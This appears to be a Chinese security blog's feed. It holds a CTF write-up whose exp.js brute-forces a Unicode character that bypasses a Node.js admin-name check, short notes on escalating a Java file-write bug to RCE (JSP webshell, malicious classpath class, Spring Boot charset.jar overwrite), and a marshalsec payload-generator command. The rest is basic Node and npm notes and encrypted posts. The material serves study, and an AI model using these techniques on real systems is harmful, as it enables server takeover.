title="MMCTF"></a>MMCTF</h2><p><code>nodejs</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;what&#x27;s your name?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> name=req.<span class="property">body</span>.<span class="property">name</span>.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">if</span>(name.<span class="title function_">toLowerCase</span>()!==<span class="string">&quot;admin&quot;</span>&amp;&amp;name.<span class="title function_">toUpperCase</span>()===<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">man</span>.<span class="property">attack</span>=<span class="number">300</span>;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;you&#x27;ve been stronger&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;you are not admin!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>exp.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">300</span>;i&lt;=<span class="number">305</span>;i++)&#123;<span class="comment">//65535</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+i);</span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    name=<span class="string">&#x27;adm&#x27;</span>+<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+<span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">    <span class="keyword">if</span>(name.<span class="title function_">toLowerCase</span>()!==<span class="string">&quot;admin&quot;</span>&amp;&amp;name.<span class="title function_">toUpperCase</span>()===<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;success&#x27;</span>+<span class="string">&#x27;:&#x27;</span>+<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+<span class="string">&#x27;:&#x27;</span>+i);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/javabean%E4%B8%8E%E5%86%85%E7%9C%81/"/>
      <url>/2021/11/10/javabean%E4%B8%8E%E5%86%85%E7%9C%81/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/uu5666/p/8601983.html">https://www.cnblogs.com/uu5666/p/8601983.html</a><br>简单的说安全问题就是可以调用set和get方法<br>参考 CB 链</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/java%E5%86%99%E6%96%87%E4%BB%B6rce/"/>
      <url>/2021/11/10/java%E5%86%99%E6%96%87%E4%BB%B6rce/</url>
      
        <content type="html"><![CDATA[<h2 id="如果Java项目存在写文件操作怎么rce"><a href="#如果Java项目存在写文件操作怎么rce" class="headerlink" title="如果Java项目存在写文件操作怎么rce?"></a>如果Java项目存在写文件操作怎么rce?</h2><h3 id="1-普通的Java-web项目"><a href="#1-普通的Java-web项目" class="headerlink" title="1.普通的Java web项目"></a>1.普通的Java web项目</h3><p>直接写jsp木马 （如果能解析</p><h3 id="2-如果不能解析jsp"><a href="#2-如果不能解析jsp" class="headerlink" title="2.如果不能解析jsp"></a>2.如果不能解析jsp</h3><p>通过写class文件让其触发某一个方法然后重写该方法rce。也就是把恶意类写入classpath( target/classes)，再通过某种方式加载、使用该恶意类，触发该恶意类的static代码块或执行该恶意类的某个方法，来实现通用的RCE利用。重点关注class.formane<br>可以参考2021国赛的ezj4va 就是通过重写readobject方法去触发rce。<br>或者可以参考d3ctf中的no rce题中也是写入target/classes中实现静态方法。然后通过jdbc去初始化恶意类触发。</p><h3 id="3-如果项目是jar打包启动的"><a href="#3-如果项目是jar打包启动的" class="headerlink" title="3.如果项目是jar打包启动的"></a>3.如果项目是jar打包启动的</h3><p>面前自己遇到的是springboot项目 通过覆盖charset.jar去hook实现rce。大概原理就是jvm启动的过程中不会全部加载资源如charset.jar是不会加载的只有通过特点方法才会加载。这样可以减少Java内存的消耗。<br>参考 文章springboot写文件rce</p><h3 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h3><p><a href="https://landgrey.me/blog/22/">https://landgrey.me/blog/22/</a></p><p><a href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/</a></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p><a href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a></p><p>&gt;<br><a href="https://www.cnblogs.com/wh4am1/p/14681335.html">https://www.cnblogs.com/wh4am1/p/14681335.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;token=1393640502&amp;lang=zh_CN&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;token=1393640502&amp;lang=zh_CN&amp;scene=21#wechat_redirect</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nodejs的序列化与反序列化</title>
      <link href="/2021/11/10/learn/"/>
      <url>/2021/11/10/learn/</url>
      
        <content type="html"><![CDATA[<h1 id="nodejs-的序列化与反序列化"><a href="#nodejs-的序列化与反序列化" class="headerlink" title="nodejs 的序列化与反序列化"></a>nodejs 的序列化与反序列化</h1><h1 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h1><p><code>stringify</code>函数的作用就是序列化对象，也就是说将对象类型转换成一个字符串类型（默认的分割符（”&amp;”）和分配符（”=”）），先介绍它的基本用法，在下一节里我们将学习如何替换默认分配符，下面我们就通过以下例子来清楚的认识一下吧！</p><p>例1：querystring.stringify(“对象”)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> querystring= <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = querystring.<span class="title function_">stringify</span>(&#123;<span class="attr">foo</span>:<span class="string">&#x27;bar&#x27;</span>,<span class="attr">cool</span>:[<span class="string">&#x27;xux&#x27;</span>, <span class="string">&#x27;yys&#x27;</span>]&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);　　</span><br></pre></td></tr></table></figure><p>运行结果：<br>foo=bar&amp;cool=xux&amp;cool=yys</p><p>对象被序列化为字符串之后默认是通过分割符（”&amp;”）和分配符（”=”）组成的，那可不可以改变呢，这节我们就来了解一下，是否可以自己去定义组合结果，看下面的小例子</p><p>例1：querystring.stringify(“对象”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.stringify(&#123;foo:&#x27;bar&#x27;,cool:[&#x27;xux&#x27;, &#x27;yys&#x27;]&#125;,&#x27;*&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#39;foo$bar*cool$xux*cool$yys&#39;</code></p><h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>接下来就来学习反序列化函数——parse函数，parse函数的作用就是反序列化字符串（默认是由”=”、”&amp;”拼接而成），转换得到一个对象类型。如下示例：</p><p>例1：querystring.parse(“字符串”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo=bar&amp;cool=xux&amp;cool=yys&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><code>&#123; foo: &#39;bar&#39;, cool: [&#39;xux&#39;, &#39;yys&#39;]&#125;</code></p><p>现在我们学习parse函数的扩展用法，和上面stringify函数的多参数用法不同的是，parse函数可以根据用户所自定义的分割符、分配符来反序列化字符串，从而得到相应的对象结果.如下示例：</p><p>例1：querystring.parse(“字符串”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo@bar$cool@xux$cool@yys&#x27;,&#x27;@&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#123; foo: &#39;&#39;, bar: &#39;cool&#39;, xux: &#39;cool&#39;, yys: &#39;&#39; &#125;</code></p><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/smiler/p/4741875.html">https://www.cnblogs.com/smiler/p/4741875.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/npm%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/11/10/npm%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><p>当我们没有项目的时候需要通过<code>npm -init</code>来部署一个项目</p><p><a href="https://www.cnblogs.com/WD-NewDemo/p/11141384.html">使用“npm init”初始化项目</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package name:                      你的项目名字叫啥</span><br><span class="line">version:                          版本号</span><br><span class="line">description:                       对项目的描述</span><br><span class="line">entry point:                      项目的入口文件（一般你要用那个js文件作为node服务，就填写那个文件）</span><br><span class="line">test command:                     项目启动的时候要用什么命令来执行脚本文件（默认为node app.js）</span><br><span class="line">git repository:                    如果你要将项目上传到git中的话，那么就需要填写git的仓库地址（这里就不写地址了）</span><br><span class="line">keywirds：                       项目关键字（我也不知道有啥用，所以我就不写了）</span><br><span class="line">author:                         作者的名字（也就是你叫啥名字）</span><br><span class="line">license:                        发行项目需要的证书（这里也就自己玩玩，就不写了）</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/controllerha/article/details/84256852">npm安装报错npm ERR! Refusing to install package with name “xxxx” under a packagexxxx</a></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>检查package.json下的name字段是不是项目名字和你安装的那个包名字相同了，如果一样就会报那个错，把项目名字改成和你安装不冲突的名字</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/marshalsec/"/>
      <url>/2021/11/10/marshalsec/</url>
      
        <content type="html"><![CDATA[<h1 id="marshalsec使用"><a href="#marshalsec使用" class="headerlink" title="marshalsec使用"></a>marshalsec使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-a：生成exploit下的所有payload</li><li>-t：对生成的payloads进行解码测试</li><li>-v：verbose mode, 展示生成的payloads</li><li>gadget_type：指定使用的payload</li><li>arguments: payload运行时使用的参数</li><li>marshalsec.<marshaller>：指定exploits，根目录下的java文件名</marshaller></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web安全资源分享</title>
      <link href="/2021/10/23/Web%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
      <url>/2021/10/23/Web%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a5886b750ee964176480bfc69f939fff54c6b76220db54bd574af4b40da91cf5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是容易感染的</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet内存马</title>
      <link href="/2021/10/10/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/10/10/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d622d096d007665159a819cfd21de9f81915870356fd032dadb0bb44ab3c6a4f">48e22157b1ef105701eba779d55791b94473791e743914b36adcaf48d5050f2b279c109324bc309296f8120b7e5c218b32be821d6c62ad5ba8e72ae0a87a77dc287deb06b27cf7e98f6a3bc67712a151e9eefba7d4665d271eb43fc7920d1b9601c6ee7b3cb6a51a8940c7acedfb5f8646f9d802466b8d3eb8cd63ca8f65cf3f2efab1f4b9ae01b92192e9aeabd741df8d975fe016c257e70708e15cfafb1b62d533597f12f83e7bddac627b671b2023f73fff4580b60f9920b1d5b7d1cbabc69c3efe2b8f108ebb360415065dffe392481f0c0adc7c1c8b25bbe5642f1cf8932bfd87e260adc8adf6153106dac7dca31f79bb96317306c5e062ab3a2d61d875e9013100b21a53ed231b22c621d5521504e8e5ae0dfaa39c32add3de01326107cf68896666fe54690e97d2c83336d4b68d2d0d81e33d14765b1b63cf85adedd5ac328989de3e553f50995cdfd578468a48f089ce3511aca49f1dafb8114ab3215727ee16ffbefc14bb92e1050d97fd387da17b6e57dfa1ce6d5e336367fa23d978e1d574b029556fceb8cc31569e96c66d292026a2b87a5b19a8a88bdd69d6227196d11a4d483f1df1e2e6d3d788a67b19f73128e1b7bc442b965855374f490b8e70618ec5711b8d2ca7379d22cb1d7dab26f0978fd39335950ddc3661b5a170f195c4a8881c124ab607c5dbd8ef94d95569322e79181d1a785ac7adc665b1ffc52d22c138b3cd3f13ad44c7747074fdba752c606a60b730a7e1bb871b7c8d2a9728dcd9e0120629aae8af0d9212dbc07354d401a878c2555ce0e0b3ba8b679b5f9835b6ac5c4e57d2df9df40c5ba3fbce346abf15722621fec20301fefad902bfa454bf14eb344483b3dd867140be55591430760c05548dc2589c78ceea7959c909ba92a688fd537155acb0d24b923947010c34ffa9867951d02961f9ab3f164d8200d4d99a9bcc1866049b7430d47d740adfc33c34e61feb4635c867fc4e17cd742fc384aa6d23680c2c42c0178020f7555057d0cb49f15cb34ef2a6a30af2e70cb45f9142a4591df66b759855ad30a0f94195a5dd1a2dafde9a73d2195b63bdaffbbed5fedded80db5c22dc7cf21c44ce4775ff946682c238cf0cbd416be963ddb116f6fe0a2965b93e3eaa34af305bec1ae91af415247cbf093c614919c09147041a4f1b01e8e6ad7551a023e6c5719c17d1dec7d6c57b369afdd8f5a0bf4325e8e3f79f31fcd311b6ad7337f450af4fca4d2aa327382a28d32b3c684e9841836df83bbbd3bd684b6095a7f4e7de33bd270d48eeb9988f4f5741f8df36ef44d903d69a54639afebe128a9ba23482581e69966feb5323973bdabd0edf6217ac569285bfd50647bf63a161b6302de04d10b7a741239e7008b9fcbc77d57ded79075f299a9d8a27366f0f42bd0df4258d1e533d75cd779fd159acba8cc4c82759ffaddfc96f4f049435fa138e1cae7eae475612d5d2845877984b889c5af8ce2d81bd45cae1b3eb443a625b2adaf0914fcdc91fbf40366117aad8ba15406ca9dd51ab42aa762af4d5085ca11661fa64ea21bec7514ff5c174f8d8a315c2cb7b58d0527837a9a5e37be37b4a6b271b7824eec0536bf3b7bd25b2272eae041c170c7a1733f98ee5091d2d8ad81dd862cdac2c92256b3c013b60a2902ddfe7f170dfdc5d674f68af18f716d52cf959a563a1ba119d33b9ffbb0ddef9661a6abe0c3b844dede0dfe1b9ab735c6a764e045d02e79027280c7d28bd799ecd8aaa9c76bb8c6f4e515aa21eacb96926a7cfc261518ca8aa971dfc5c71ba901a35247d0717d21a14c8191e971a768cee81561db900f613e5160f6e228d4d9a589a39c5591f09d0abad3454874cd01a8db29e06c62888be02865f4d479bd49cc0894587a20ba53f8ff5372322d0ad843567b67ad5645b747223e6f3f43c9833fe01652268e95bfceda6c613086f1cc5e47ea9a998da9a03687d07b4fc95031ccbec1a88008c8399ed44d16bc90d7f675b3e2db96ffc31a4d856206b305074ac5efe9c410d71f81a32da642913557ca182be949f2ccc672c106fc2bdc97e8ac266c151fcc8210a824dc3a0bb0e583783e9529ff31c1720c0a6ce31de8ed98032b6a4df1b6cca57865c3b15d410f6741f36df177621b014850182f8ebe5357062008a90a1a3e4a41bcd3b931ab0640cd1097c80af70093d0399d87dd00668591d2b05d98ea58aaa0a62982c3d73eff9955ea506b619e74f6586d6d5f496e1319d6958941757fe8a6f56f98baa9dcd5d04a6cd60f975426e97028c9f2fe6d864a05225f64dec503bfec35aa98aa9bbe3ef55c503080af07f18f778d402f1fda9c6bef794ec43e2e4317de151f007b1026fb67eeb9f8f70435486d4a2d36ec6d1b35c5ba51b6f140c063384f1c8c097b98e32065df5ce3326b8cec657f3a206b2b3fa800f812fa961c7d7676e4742036988d019f75177b187807e43adcd44175d51c3a4935c21a5a6a1e54fa8abbe39b54e760e0dca832be6b80bdf7878a24353010981a32971c83732c619d0263569954c8cdf5d2a097b0e150ff0c3c1001ed4e95631f97e8a249f4762f8b7209a639715485c306b1e8b6ad4ec55126bc7feeeebef60262ad10187f35e63a6a2ada6c03e5982e6cc8b3b91577aa97de48638859efd8270c21ca18243ba2e3249800897024f1fdffdb2ed54c0571288b99a300fb3e56cc9cca0db23874eef8bfaa19872ec242444136fd242ced4f2a9a45192db0b2ed456f3c69b7b6e3769bcbd4ed63829161b22dcf2021144f2a33d5cb5469f101223f11fd8610a56b8c4037ac88dcec7e9cf7c0d6bdf4a4e2dc89e679541364a2bc10b9a81cb511142b7caee846c385afdaab8defd0e715308600f6e5c5ff8126161396fc7a28c5ccf40cb1d1bae1a0ff34ae56d72ebb3848a9f416cf9db1e856ff041dcde09fe033aadbede79698c021ad44894007c551678b07e4acdf1d2468ed0d4d71fecd127043278036068a95f276d75f894d0210c5a3a3326b5eac33a735e8ae179159823f3a0c0f79221f410624bc722b53cefb79226a4931f5829dd81d11ff0b5e40f0f04139f37c6f9f94561472e5bfdc37bd18fa2fee1f103e9f989f8e6f9853905af279d89ee21e02bb054c056abbad0a45b7478558544044dc232ed6395a9402da52297168802f3f7d3cc94824734e2ab4afd770b5c7a1671e31f3ffbfe15d9c3d1435474cdb46adb4e301374aa5db183da25ad43f990efacd96f94da14cfa26501ac3eda9176d9a9bc070185f50d156b801eecbe4735072d19b87779de19b4b703ed2e66350cdc57bec47f05bdb3878affe44cd8effad5c6e58c107e130244b7f6e0d7441f54810ddc4acaeccfcd12fb0428acfd0ade9e20c0d82b1d1ed89bf340df350504171b15d2bb4431a3c408595c70982a68f20313479c769a4e49e46c2c2bcadd8a6861da8da6308a7fb2b8a98003b90549b47ca43b0755beb2d73cd2746d62727a2d7be5d94e044bff7f1069e9d4f29beea2f83240848a828072b4e6f5b663c2eb48f493d8b451f0eecf456aec2789f4dba778f23fbcd538abbef6b9a229c94b69227115b78bf7e59f742afdc37668dfc8dd0a7cff12da93060c0e214c55ec529deb299dd9c49431e63667bf7332dbf59d200f1ad7ff4800b8e27c84c433915e4295f4a9537ef4281ea9a27c2306dea3663424140ed76a17d2741cb6c4c76a06ad7fa9f276dcf18e94ad35aa5a6d972b4e2d920a9a6e27a0113ca47760ed4c6331116ddc8b2ea065a88ae49f21d0becba57e99d72b23e0778062a615c89587a5211723472b5f0c6e0c4193c5859f558e2aff94e39f3d8fa19f6e43ae350e1d436f569ec3d846e48e95315e359e0328ccaa4d9cd8bc1a8bcaf732a90d4ac4537841d3bceb6f8900a2eababa4e461075b51eee9317e946a7a128db7ac0bff3e41e3398c814d1ee392f1673982ca1df7f9e62ce071d1ed6cfd1e711f41adb063d0a047d73410f0fa5ec6d0a5bd10af16031c72dd4e58180ace76b10d014a86bb3c3821be2c806cb02b9f74bbbf99e91d842d46e719bac0047732efcad39821b3f8e2a39fb74dd6852380f4ded3d82807b2b7b98f58676307006a2e606316888c3d158a6086e3ef6b6cf54f8ff4f7e6a2c0f57e5b1db5fdf3a8d0506817662e7597ed854f6232f5c3349ed47676d6b0d1b3fe16b60ff0a820c36f8dd0765b883379fbe89a31739139eaf33fcbe35e183ff13a1d5f794a5bf1e18a9861b209470237989aac91f2c5d7df2aeb34d0bcd9eadee6c6bc6c2d3475e45b704e172d4a5e6591ff1197435082d8f265b3701cbd8127c4b381547d4d2e36572944c427eda5466966aec63b3b8d57f1f9f4458868fefefc01e636e8a78aaed4ba5cae5e63a7472b205c4944fbbf521d42e920913e419cd4401a85019aefe7de625e1325f28e0f652c98c311da42445947be0118864c6efbd0eb34b5ca2041e3106b5c2c45ef501c02dc77b217825d67c5541556045919aa380a292a5ee20a24998adb3dffcc8a36ccc6065b2da5dfc5680d74f768e0c1c30e1e7f5437f1acd4ffc6ca268c5531d7abce189d29737bb7e8d952de183539dd8bf37b3c352b1df1ea1b4f415a4709a835ad9f17c3cad5459bc91b505dcbe7d1338a4bf5e7709e2336fe3fe32d6150eb0cf520b1309dab5cb2ea3cddf2c21c1e6735c18f44c999b19c238f46e2db6bca552839a14b91cc0b07a4bf07907a702bee747927f18e9aadf1deaf8fa2ecbbda9cd92f0ecbb9bb03dd6682f53fed62efff477716b8f38a336d9021fef630068781a2ad3e948406ee831200bb143a540bffa65f0ac9f7e4f43d67ea6debdb9505f2b81ff9cc967c9a565ae40de449cbe4f5a5006b3bef3487617a27d4c306f2f12b3f616b23ded318a488097a7b4b5be8f022112e5c5acd9c1715c03e6970b777901fa9a47bf029f2b08747593cffcf8afc066263dd3d479d6e180af0686e3c2af3e429b77b774abbcfde79fbca7827852b1f8a00367c50d14b5dabd67f62d432ab907b94a91c6ab620267009fee1c3851e4f6742eb170f2f44d71d3a1a95c82d2bf7a5254d778efa01b00f368504d5245a83b4d4fdff83eba569f7c8f6a0df258585900619e9a0d1d6180c875d3bd3802648cedc0a44595ea09ff1ba02e5b2151a2cef6720748fdb3d2e5552273963345b536602cf17c544132c6801b1de0bdcd03c994e31858143c0284fc5201086ea3eb9fbda5c07a48810299478b16517901a73083caff0221b6e2f90802ad5e0eca4a1604ab07d5a259ce3bbf58d6db33fd1f64d207185d4416340e69f5c0dc09509bf9ee630055e38a0feb44c872c6fa80034ed7ab2cd36e5b4ce8b54523e807f0d25c38bdb2ddfeb8c9814867c45ae9aa2ac65c2bbd2b2c6ae20cb1405ce0f2bb409d1dd2d03f7ca78fabb8ff303c5fd8c0d779b56f0ee4943cc4bc8b2f194289899097a81bd0f4b679bec47bb0c9bcea7435b29596288b487202df94cf81b9ec662d5524fbbaccd5afa353c4a162fab8bd65fd11d31a4b80a4979bdf2638b5efd721480d4e2cdc756fbd1fd6a5e75b05fe2c434d41a94fb23af5b2a8b407ca58d234ff0f635754119a7bc2ed7ed56832b5168125dd3f1bd9ed005e76338bc4a0728df663e5c987c46b2e84c0006d2d691f75f86722f30c0f038c928b45a60485466b6da10f2e44d05a98371f375ef9b3825bfeddd6b694e3f3fff6049f166fe30d7b385404efe24b65122b5b9c82fba34fe0b9babe633b44e7c7650ebd29d57f2bc1ac903bad3e3cc5e2c8cd7cd8e973b771f361794e5c1b7f5d973540f31cf7768f43d8127ac0cc07cf032f6731e7b7e3aa56ccf287b51304c1c5a6d72182391693c2a8a1e61eeace5c22783e456965cd15d175db832dc475798530b09e8afcbc6026156ca2768ad86690bd29769d12c1064b842389d7a9aa465c70cdd05dca472f3b4e6075bfb34630687995113b90442398c245965d51d83d4ad499480983b1718425e233d79156f34e33fcf16530010ac8c0c408af0c31d0022534f8a497f84b85010ce5e7295e3ecfe82a061cc1850583e9b151e5657e1a6ae031dbaa607428689c8f71672efb6759f7cdbba44e371777345443c7e69a82148da9610ddc5d168b71f02fe4489ba27d3bb95bd3987fd80f1e2892db0cdc50758a1699f8e02476bd4cec61fdc36a9938d416ba8b459e646ccc188a8c167d4dd79f9591d170bc60827f462b8f07bfbde6eb921df2d65d581c51e8e7638571e2aadf52ba052466cd0a51119bd031bb000de76f95a7888162062e5aef9137105e7ded35a170914814224aa885e85613cea2a76cfdec9a56a50939073a36635d09991fc4145bcb7c7599cc3e0f6ac364c44408272750d3168591600f2265c4f40cddcb9551fd63472aae175edc5e96e52e47fe817fd27c9d4fef0ea8da1b687cbabb244a234c2c4f9a90c176a35ffea03ef829b374625f7e3598ee1c4542363015ecd48921a2fdb311b98ed372ff3180227ba0eb8b1f01bbd19517f30e42287b051e4c3f3e902193b713e60b4343322dda4a1ffeed1889306b244ad708c65b605b1d60b9a00e7d7527383f3916685ae3cc5521225efc7699acdf334b03e8f7afc7f363c1aa7a62ccc9cb87c4085f523d054b5b734a6f41685507bf20b2d6f6f6658e327a802b7e7a5b673cc9d00b0fcaddddc50ec7cdccc532589888ff811bb4eea3705ab696129d2facaa7ba77b12fd4de1fc0545f7e8bc5c45cea02bf5be193deef8acde1f40b69e08c0e62780e810ddfafd10e4d344d3b3c39ce71e66e138b8a8577d0d4bb209af19bdec7c76f7c14b004b79637af10625e06f6a5beab558d74f1abc51d0ef40c41e2fd33246d021408d35e3798be8cf8a7414f27f8509f41db73aba2e23c7870cfc248e42a2f6557092fc88aa94f05f95b2ca9073d35dd47d0e6281e5fa8c572f112c75e0f1463a0dcb726aa416a0bacac38d83c47da73b1dc55b43d826cb6fbba24057159685713fa9ab1d19275689ca9f8d397816fb35acf1aafa83fc6272be3c7e181f6e53885e3c77028caf40bd47ebdc6208d15b9554e77daf3704818b7be46f654cb